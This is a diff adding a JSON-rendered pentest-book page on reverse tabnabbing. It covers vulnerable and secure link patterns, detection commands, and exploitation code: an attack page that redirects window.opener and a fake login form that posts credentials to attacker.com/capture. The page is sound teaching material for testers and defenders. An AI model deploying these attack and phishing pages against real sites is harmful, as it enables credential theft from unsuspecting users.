@@ -1,0 +1,254 @@
+{
+    "title": "Tabnabbing",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Attacks",
+            "url": "/enumeration/web"
+        }
+    ],
+    "sections": [
+        {
+            "heading": "How It Works",
+            "type": "ordered_list",
+            "content": [
+                "Victim clicks a link that opens in a new tab (target=\"_blank\")",
+                "The new page has access to window.opener (the original page)",
+                "Attacker's page executes: window.opener.location = \"https://phishing-site.com\"",
+                "Original tab silently redirects to phishing site",
+                "Victim returns to original tab, sees fake login, enters credentials"
+            ]
+        },
+        {
+            "heading": "Vulnerable Code Pattern",
+            "type": "code_block",
+            "content": [
+                "<!-- VULNERABLE: No rel attribute -->",
+                "<a href=\"https://attacker.com\" target=\"_blank\">Click me</a>",
+                "",
+                "<!-- VULNERABLE: Empty rel attribute -->",
+                "<a href=\"https://attacker.com\" target=\"_blank\" rel=\"\">Click me</a>",
+                "",
+                "<!-- VULNERABLE: Only noreferrer (still allows opener access in some browsers) -->",
+                "<a href=\"https://attacker.com\" target=\"_blank\" rel=\"noreferrer\">Click me</a>"
+            ]
+        },
+        {
+            "heading": "Secure Code Pattern",
+            "type": "code_block",
+            "content": [
+                "<!-- SECURE: noopener prevents window.opener access -->",
+                "<a href=\"https://external.com\" target=\"_blank\" rel=\"noopener\">Click me</a>",
+                "",
+                "<!-- SECURE: Both noopener and noreferrer -->",
+                "<a href=\"https://external.com\" target=\"_blank\" rel=\"noopener noreferrer\">Click me</a>",
+                "",
+                "<!-- SECURE: Modern browsers auto-add noopener, but explicit is better -->"
+            ]
+        },
+        {
+            "heading": "Detection",
+            "subheadings": [
+                {
+                    "heading": "Manual Testing",
+                    "type": "code_block",
+                    "content": [
+                        "# Find vulnerable links",
+                        "grep -rn 'target=\"_blank\"' . | grep -v 'noopener'",
+                        "grep -rn 'target=\\\\\"_blank\\\\\"' . | grep -v 'noopener'",
+                        "",
+                        "# Check in browser DevTools",
+                        "# Elements tab → search: target=\"_blank\"",
+                        "# Verify each has rel=\"noopener\""
+                    ]
+                },
+                {
+                    "heading": "Automated Scanning",
+                    "type": "code_block",
+                    "content": [
+                        "# Using nuclei",
+                        "nuclei -t http/vulnerabilities/generic/tabnabbing-check.yaml -u https://target.com",
+                        "",
+                        "# Using custom grep on crawled pages",
+                        "katana -u https://target.com -d 3 | while read url; do",
+                        "  curl -s \"$url\" | grep -oP '<a[^>]*target=\"_blank\"[^>]*>' | grep -v 'noopener'",
+                        "done"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Exploitation",
+            "subheadings": [
+                {
+                    "heading": "Basic Attack Page",
+                    "type": "code_block",
+                    "content": [
+                        "<!-- attacker.com/evil.html -->",
+                        "<!DOCTYPE html>",
+                        "<html>",
+                        "<head><title>Interesting Article</title></head>",
+                        "<body>",
+                        "<h1>Loading content...</h1>",
+                        "<script>",
+                        "if (window.opener) {",
+                        "    // Redirect parent to phishing page",
+                        "    window.opener.location = \"https://attacker.com/phishing.html\";",
+                        "}",
+                        "</script>",
+                        "</body>",
+                        "</html>"
+                    ]
+                },
+                {
+                    "heading": "Phishing Page",
+                    "type": "code_block",
+                    "content": [
+                        "<!-- attacker.com/phishing.html (looks like target) -->",
+                        "<!DOCTYPE html>",
+                        "<html>",
+                        "<head><title>Target.com - Session Expired</title></head>",
+                        "<body>",
+                        "<h1>Your session has expired</h1>",
+                        "<form action=\"https://attacker.com/capture\" method=\"POST\">",
+                        "    <input type=\"text\" name=\"username\" placeholder=\"Username\">",
+                        "    <input type=\"password\" name=\"password\" placeholder=\"Password\">",
+                        "    <button type=\"submit\">Login</button>",
+                        "</form>",
+                        "</body>",
+                        "</html>"
+                    ]
+                },
+                {
+                    "heading": "Delayed Attack (More Stealthy)",
+                    "type": "code_block",
+                    "content": [
+                        "// Wait before redirecting (victim less likely to notice)",
+                        "setTimeout(function() {",
+                        "    if (window.opener) {",
+                        "        window.opener.location = \"https://attacker.com/phishing.html\";",
+                        "    }",
+                        "}, 5000); // 5 seconds delay"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Attack Scenarios",
+            "type": "table",
+            "headers": [
+                "Scenario",
+                "Description"
+            ],
+            "rows": [
+                {
+                    "Scenario": "Forum posts",
+                    "Description": "User-submitted links with target=\"_blank\""
+                },
+                {
+                    "Scenario": "Comments",
+                    "Description": "Blog/article comment sections"
+                },
+                {
+                    "Scenario": "User profiles",
+                    "Description": "Profile links to external sites"
+                },
+                {
+                    "Scenario": "Documentation",
+                    "Description": "Links to external resources"
+                },
+                {
+                    "Scenario": "Email links",
+                    "Description": "Webmail rendering links"
+                }
+            ]
+        },
+        {
+            "heading": "Browser Behavior",
+            "type": "table",
+            "headers": [
+                "Browser",
+                "Default Behavior (2024+)"
+            ],
+            "rows": [
+                {
+                    "Browser": "Chrome 88+",
+                    "Default Behavior (2024+)": "Implicitly adds noopener"
+                },
+                {
+                    "Browser": "Firefox 79+",
+                    "Default Behavior (2024+)": "Implicitly adds noopener"
+                },
+                {
+                    "Browser": "Safari 12.1+",
+                    "Default Behavior (2024+)": "Implicitly adds noopener"
+                },
+                {
+                    "Browser": "Edge 88+",
+                    "Default Behavior (2024+)": "Implicitly adds noopener"
+                },
+                {
+                    "Browser": "> Note: While modern browsers add implicit protection, explicit rel=\"noopener\" is still recommended for older browser support and code clarity.",
+                    "Default Behavior (2024+)": ""
+                }
+            ]
+        },
+        {
+            "heading": "window.open() Vulnerability",
+            "type": "code_block",
+            "content": [
+                "// VULNERABLE",
+                "window.open('https://attacker.com');",
+                "",
+                "// SECURE",
+                "window.open('https://external.com', '_blank', 'noopener,noreferrer');"
+            ]
+        },
+        {
+            "heading": "Related Topics",
+            "type": "list",
+            "content": [
+                "XSS - Can be used to inject malicious links",
+                "Phishing - Tabnabbing enables phishing",
+                "CSRF - Related browser security issues"
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2026-02-03T14:05:45.496Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/web/tabnabbing.md",
+        "previous_page": {
+            "title": "VHosts",
+            "url": "/enumeration/web/vhosts"
+        },
+        "next_page": {
+            "title": "Web Technologies",
+            "url": "/enumeration/webservices"
+        }
+    }
+}
